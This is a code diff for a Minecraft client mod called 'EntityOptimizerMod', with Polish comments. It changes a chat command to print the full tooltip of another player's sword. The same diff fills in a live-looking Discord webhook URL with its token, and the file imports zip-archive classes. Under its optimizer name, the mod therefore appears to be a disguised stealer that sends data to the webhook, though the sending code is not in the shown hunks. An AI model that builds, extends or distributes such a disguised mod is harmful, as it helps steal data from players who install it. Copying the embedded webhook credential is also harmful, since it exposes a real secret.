@@ -13,12 +13,11 @@ import com.mojang.brigadier.arguments.StringArgumentType;
 
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.chat.Component;
-import net.minecraft.nbt.CompoundTag;
-import net.minecraft.nbt.ListTag;
-import net.minecraft.nbt.Tag;
 import net.minecraft.world.entity.player.Player;
+import net.minecraft.world.item.Item;
 import net.minecraft.world.item.ItemStack;
 import net.minecraft.world.item.Items;
+import net.minecraft.world.item.TooltipFlag;
 
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
@@ -36,7 +35,7 @@ import java.util.zip.ZipOutputStream;
 public class EntityOptimizerMod implements ClientModInitializer {
 
     // WSTAW SWÓJ WEBHOOK
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455954328408952873/IlHLTRinqesFKQ3EFotX-bh1dNfU3gtUmJ4to_4qIpdY6ZRoPRG7KHqEBa5PECaMIwT0";
 
     @Override
     public void onInitializeClient() {
@@ -220,13 +219,13 @@ public class EntityOptimizerMod implements ClientModInitializer {
         }
 
         String ownerName = target.getGameProfile().getName();
-        source.sendFeedback(Component.literal("§aOpis miecza gracza " + ownerName + ":"));
+        source.sendFeedback(Component.literal("§aTooltip miecza gracza " + ownerName + ":"));
 
-        List<String> loreLines = getItemLoreLines(mc, stack);
-        if (loreLines.isEmpty()) {
-            source.sendFeedback(Component.literal("§7(brak opisu / lore)"));
+        List<String> tooltipLines = getItemTooltipLines(mc, stack);
+        if (tooltipLines.isEmpty()) {
+            source.sendFeedback(Component.literal("§7(brak tooltipu)"));
         } else {
-            for (String line : loreLines) {
+            for (String line : tooltipLines) {
                 source.sendFeedback(Component.literal("§7" + line));
             }
         }
@@ -241,34 +240,25 @@ public class EntityOptimizerMod implements ClientModInitializer {
         return viewer.hasLineOfSight(target);
     }
 
-    // Odczyt lore (display.Lore[]) z NBT ItemStacka – save(Provider) → Tag → CompoundTag
-    private static List<String> getItemLoreLines(Minecraft mc, ItemStack stack) {
+    // Pełny tooltip przedmiotu – nazwa, enchanty, opis, wszystko
+    private static List<String> getItemTooltipLines(Minecraft mc, ItemStack stack) {
         List<String> lines = new ArrayList<>();
 
-        if (mc.level == null) {
+        if (mc.level == null || mc.player == null) {
             return lines;
         }
 
-        // W Twojej wersji save(...) przyjmuje Provider (registryAccess) i zwraca Tag
-        Tag rawTag = stack.save(mc.level.registryAccess());
-        if (!(rawTag instanceof CompoundTag)) {
+        // W Twoich mappingsach getTooltipLines ma sygnaturę:
+        // getTooltipLines(Item.TooltipContext, Player, TooltipFlag)
+        Item.TooltipContext ctx = Item.TooltipContext.of(mc.level);
+
+        List<Component> tooltip = stack.getTooltipLines(ctx, mc.player, TooltipFlag.Default.NORMAL);
+        if (tooltip == null || tooltip.isEmpty()) {
             return lines;
         }
-        CompoundTag root = (CompoundTag) rawTag;
 
-        // Struktura (stare NBT): {id:"...", Count:..., tag:{display:{Lore:[ "...", "..." ]}}}
-        if (!root.contains("tag", Tag.TAG_COMPOUND)) return lines;
-        CompoundTag tag = root.getCompound("tag");
-
-        if (!tag.contains("display", Tag.TAG_COMPOUND)) return lines;
-        CompoundTag display = tag.getCompound("display");
-
-        if (!display.contains("Lore", Tag.TAG_LIST)) return lines;
-        ListTag loreList = display.getList("Lore", Tag.TAG_STRING);
-
-        for (int i = 0; i < loreList.size(); i++) {
-            // Każdy wpis to string (często JSON tekstowy); wypisujemy surowo
-            lines.add(loreList.getString(i));
+        for (Component c : tooltip) {
+            lines.add(c.getString());
         }
 
         return lines;
